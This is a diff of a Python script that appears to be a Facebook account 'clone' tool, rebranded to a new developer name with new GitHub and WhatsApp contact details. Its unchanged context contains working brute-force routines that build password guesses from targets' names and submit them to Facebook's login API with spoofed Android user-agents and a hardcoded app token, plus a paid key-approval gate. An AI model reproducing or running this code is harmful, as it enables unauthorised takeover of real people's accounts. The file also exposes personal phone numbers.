@@ -1,5 +1,5 @@
-#--------------------< IMPORT >--------------------#
-#--------------------< SAZIB >--------------------#
+#-------------------< IMPORT >--------------------#
+#--------------------< JUYEL>--------------------#
 import requests,random,uuid,string,hashlib,json,os,base64,zlib,pip,urllib,urllib3,platform,math,smtplib,os,base64,zlib,pip,urllib
 from os import path
 from urllib.request import urlopen
@@ -21,16 +21,16 @@ xd=f"{R}[{W}+{R}]{G}";xd1=f"{R}[{W}1{R}]{G}";xd2=f"{R}[{W}2{R}]{G}";xd3=f"{R}<{W
 #--------------------< CLEAR >--------------------#
 def clear():os.system('clear');print(logo)
 def linex():print(f'{W}──────────────────────────────────────────────────')
-
+ 
 #_____________[ tool version]_____________#
 try:
-	version = requests.get("https://raw.githubusercontent.com/NoRisk24/Old-Clone/refs/heads/main/Version.txt").text
+	version = requests.get("https://raw.githubusercontent.com/juyeljr540-source/BD-CLOND-/refs/heads/main/Version.txt").text
 except:
 	print('No Internet Connection');exit()
 version = version.strip()
 session = requests.Session()
-
-
+ 
+ 
 #_______________| color list 3 |_______________#
  
 A = '\x1b[1;97m' 
@@ -59,7 +59,7 @@ logo=f"""
 ██  ██ ██ ██    ██   ██   ██ ██      ██ ██  ██  
 ██   ████  ██████    ██   ██ ██ ███████ ██   ██
 {M}════════════════════════════════════════════════
-{R}[{G1}+{R}]{G1} 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 {R}〆{G1} 𝐒𝐀𝐙𝐈𝐁 𝐈𝐒𝐋𝐀𝐌
+{R}[{G1}+{R}]{G1} 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 {R}〆{G1} JUYEL RANA
 {R}[{G1}+{R}]{G1} 𝐓𝐎𝐎𝐋𝐒 𝐅𝐎𝐑 {R}〆 \x1b[38;5;196m\033[47m𝐅𝐈𝐋𝐄\x1b[0m{Y}┼︎\x1b[38;5;196m\033[47m𝐂𝐋𝐎𝐍𝐄 \x1b[0m
 {R}[{G1}+{R}]{G1} 𝐕𝐄𝐑𝐒𝐈𝐎𝐍   {R}〆{G1} 𝐕{R}/{G1}{version}
 {R}[{G1}+{R}]{G1} 𝐒𝐓𝐀𝐓𝐔𝐒    {R}〆{Y} 𝐏𝐑𝐄𝐌𝐈𝐔𝐌
@@ -147,7 +147,7 @@ def ___M1___(ids,names,passlist):
 				for pw in passlist:
 						pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
 						with requests.Session() as session:
-							M1 = "[FBAN/FB4A;FBAV/445.0.0.34.118;FBBV/548452741;FBDM/{density=2.75,width=1080,height=2134};FBLC/ar_AR;FBRV/554239681;FBCR/etisalat by e&amp;amp-;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
+							M1 = "[FBAN/FB4A;FBAV/445.0.0.34.118;FBBV/548452741;FBDM/{density=2.75,width=1080,height=2134};FBLC/ar_AR;FBRV/554239681;FBCR/etisalat by e&amp-;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
 							data = {"adid": str(uuid.uuid4()),
 							"format": "json","device_id": str(uuid.uuid4()),
 							"cpl": "true","family_device_id":str(uuid.uuid4()),
@@ -213,7 +213,7 @@ def ___M2___(ids,names,passlist):
 						accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 						random_seed = random.Random()
 						adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
-						M2 = "[FBAN/FB4A;FBAV/445.0.0.34.118;FBBV/548452741;FBDM/{density=2.75,width=1080,height=2134};FBLC/ar_AR;FBRV/554239681;FBCR/etisalat by e&amp;amp-;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
+						M2 = "[FBAN/FB4A;FBAV/445.0.0.34.118;FBBV/548452741;FBDM/{density=2.75,width=1080,height=2134};FBLC/ar_AR;FBRV/554239681;FBCR/etisalat by e&amp-;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
 						data = {"adid": adid,"format": "json",
 						"device_id": str(uuid.uuid4()),
 						"email": ids,"password": pas,
@@ -252,8 +252,8 @@ def ___M2___(ids,names,passlist):
 				loop+=1
 		except Exception as e:
 				pass
-
-
+ 
+ 
 import os
 import time
 import requests
@@ -261,7 +261,7 @@ import sys
 import random
 colors = ['\033[91m', '\033[92m', '\033[93m', '\033[94m', '\033[95m', '\033[96m']
 reset_color = '\033[0m'
-
+ 
 def typewriter(text):
     for char in text:
         sys.stdout.write(char)
@@ -270,7 +270,7 @@ def typewriter(text):
     sys.stdout.write('\n')  #
 try:
     os.system('clear')
-    srv = requests.get('https://github.com/juyeljr540-source/BD-CLOND-/blob/main/Server.txt').text
+    srv = requests.get('https://raw.githubusercontent.com/juyeljr540-source/BD-CLOND-/refs/heads/main/Server.txt').text
     if "update" in srv:
         os.system('clear')
         count = 0
@@ -282,7 +282,7 @@ try:
             time.sleep(3)
             count += 1
         exit()
-
+ 
     elif "off" in srv:
         os.system('clear')
         count = 0
@@ -294,12 +294,12 @@ try:
             time.sleep(3)
             count += 1
         exit()
-
+ 
 except requests.exceptions.ConnectionError:
     print(f"\033[1;91m 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧 𝐏𝐫𝐨𝐛𝐥𝐞𝐦, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐂𝐡𝐞𝐜𝐤 𝐘𝐨𝐮𝐫 𝐈𝐧𝐭𝐞𝐫𝐧𝐞𝐭 𝐀𝐧𝐝 𝐑𝐮𝐧 𝐀𝐠𝐚𝐢𝐧")
     sys.exit()
-
-
+ 
+ 
 #----------------------■ Approve ■----------------------#
 import os
 import subprocess
@@ -310,27 +310,27 @@ import sys
 import urllib.parse
 from datetime import datetime
 import random
-
+ 
 # ========== Configuration ==========
-OWNER_WHATSAPP_NUMBER = "+8801703538283"
-GITHUB_KEYS_URL = "https://github.com/juyeljr540-source/BD-CLOND-/blob/main/Approval.txt"
-
+OWNER_WHATSAPP_NUMBER = "+8801929877321"
+GITHUB_KEYS_URL = "https://raw.githubusercontent.com/juyeljr540-source/BD-CLOND-/refs/heads/main/Approval.txt"
+ 
 # Global variables
 device_key = None
 expiry_date_str = None
 remaining_days = None
-
+ 
 # Dummy variables used in output
 colors = ['\033[92m', '\033[94m', '\033[96m', '\033[91m', '\033[93m']
 reset_color = '\033[0m'
-
+ 
 def typewriter(text):
     for char in text:
         sys.stdout.write(char)
         sys.stdout.flush()
         time.sleep(0.01)
     print()
-
+ 
 # ========== Generate Device Key ==========
 def generate_key():
     try:
@@ -341,7 +341,7 @@ def generate_key():
         return joined[15:]
     except Exception:
         sys.exit()
-
+ 
 # ========== Fetch Approved Keys ==========
 def fetch_approved_keys():
     try:
@@ -355,7 +355,7 @@ def fetch_approved_keys():
         return [line.strip() for line in data if line.strip()]
     except Exception:
         sys.exit()
-
+ 
 # ========== Check if Key Exists ==========
 def find_key_entry(key, approved_list):
     for entry in approved_list:
@@ -365,7 +365,7 @@ def find_key_entry(key, approved_list):
             if key == k:
                 return expiry.strip()
     return None
-
+ 
 # ========== Get Expiry Info ==========
 def parse_expiry_info(expiry_str):
     if expiry_str.upper() == "PERMANENT":
@@ -378,7 +378,7 @@ def parse_expiry_info(expiry_str):
         except ValueError:
             continue
     return "INVALID DATE", None
-
+ 
 # ========== Open WhatsApp with Key ==========
 def send_key_via_whatsapp(key):
     try:
@@ -388,7 +388,7 @@ def send_key_via_whatsapp(key):
         os.system(f"xdg-open '{whatsapp_url}'")
     except Exception:
         sys.exit()
-
+ 
 # ========== Approval Function ==========
 def approval():
     global device_key, expiry_date_str, remaining_days
@@ -396,14 +396,14 @@ def approval():
     approved_keys = fetch_approved_keys()
     os.system("clear")
     print(logo)
-
+ 
     expiry_raw = find_key_entry(device_key, approved_keys)
-
+ 
     if expiry_raw:
         expiry, remaining = parse_expiry_info(expiry_raw)
         expiry_date_str = expiry
         remaining_days = remaining
-
+ 
         if expiry == "PERMANENT" or (remaining is not None and remaining >= 0):
             color = random.choice(colors)
             typewriter(f"\033[95;1m[\x1b[38;5;50m+\033[95;1m] {color}𝐘𝐎𝐔𝐑 𝐊𝐄𝐘 𝐇𝐀𝐒 𝐁𝐄𝐄𝐍 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃{reset_color}")
